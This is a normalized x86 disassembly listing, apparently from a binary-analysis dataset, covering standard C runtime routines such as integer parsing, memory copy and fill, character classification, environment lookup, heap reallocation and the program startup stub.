cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_448086
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_43c04c
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_43a5ff
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_43a3d4
add esp 0x14
pop ebp
retn
sub_43a62a
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rw-data
jmp r-xdata
call sub_43a3d4
add esp 0x14
pop ebp
retn
sub_43a67f
push 0x14
push r--data
call sub_43f8e0
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_43f331
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_44012c
test eax eax
jne r-xdata
push 0x1c
call sub_43a656
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_448610
mov [ ebp - 0x4 ] esi
call sub_440a76
test eax eax
jns r-xdata
push 0x10
call sub_43a656
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_4485b8
mov [ rw-data ] eax
call sub_44850a
test eax eax
jns r-xdata
push 0x1b
call sub_43b74c
call sub_4482d8
test eax eax
jns r-xdata
push 0x8
call sub_43b74c
push 0x1
call sub_43b52b
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_43b74c
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_410fd0
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
push eax
call sub_43b74c
call sub_43b72e
jmp r-xdata
push eax
call sub_43b702
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_43f925
retn
sub_43a7f0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_43a820
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_4486f7
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_43a8a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_43a924 ]
jmp [ ecx * 4 + jump_table_43a9a4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_43aa10 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_43abac ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_43aab0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_43abac ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_43aa10 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_43abac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_43aa10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_43aa10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_43aa10 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_43abac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_43abac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_43abac ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_43ac80
cmp [ rw-data ] 0x0
je r-xdata
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_43ad30
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_43adc5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_448086
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43ae16
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_43adc5
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_43ae44
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_448086
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43ae95
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_43ae44
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_43aec3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_448086
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43af14
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_43aec3
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_43af42
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_448086
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43af98
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_43af42
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_43afc8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_448086
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43b019
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_43afc8
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_43b047
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_438337
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4381f8
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_43f309
pop ecx
call sub_43c04c
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_43c04c
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_43c00a
pop ecx
mov [ esi ] eax
push esi
call sub_43f309
pop ecx
test eax eax
je r-xdata
call sub_43c04c
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_43c00a
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_43b0f4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_43c860
pop ecx
mov edi eax
jmp r-xdata
call sub_44952a
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_43c860
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_449510
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_43b17b
push 0x10
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
mov esi 0x7fff
push esi
push [ ebp + 0x8 ]
call sub_4495c1
pop ecx
pop ecx
cmp eax esi
sbb eax eax
neg eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
jmp r-xdata
push 0x7
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_43b0f4
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43b1ec
mov eax [ ebp - 0x1c ]
call sub_43f925
retn
sub_43b1f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
push edi
mov edi eax
je r-xdata
pop edi
pop ebx
pop ebp
retn
movzx ecx [ eax ]
test cx cx
je r-xdata
xor eax eax
mov edx ecx
sub eax ebx
cmp [ ecx ] 0x0
je r-xdata
movzx edx [ ecx ]
test dx dx
je r-xdata
mov eax edi
jmp r-xdata
add edi 0x2
movzx edx [ edi ]
add eax 0x2
test dx dx
jne r-xdata
movzx ebx [ eax + ecx ]
sub ebx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test dx dx
je r-xdata
add ecx 0x2
cmp [ eax + ecx ] bx
jne r-xdata
sub_43b28c
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_44118e
add esp 0x10
mov edi eax
test esi esi
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_440f95
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
sub_43b355
push 0xc
push r--data
call sub_43f8e0
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
setne al
cmp eax esi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0xc ] edi
push edi
call sub_43909f
pop ecx
mov [ ebp - 0x4 ] esi
test [ edi + 0xc ] 0x40
jne r-xdata
call sub_43f925
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push edi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43b456
mov eax [ ebp - 0x1c ]
push edi
call sub_4495de
mov esi eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
call [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
push edi
push esi
call sub_44967a
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_43b47f
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_43b4d4
mov edi edi
push esi
call sub_43fe30
mov esi eax
push esi
call sub_43f2fa
push esi
call sub_43f73b
push esi
call sub_44a532
push esi
call sub_44a377
push esi
call sub_43b76a
push esi
call sub_44a366
add esp 0x18
pop esi
retn
sub_43b507
mov edi edi
push ebp
mov ebp esp
push esi
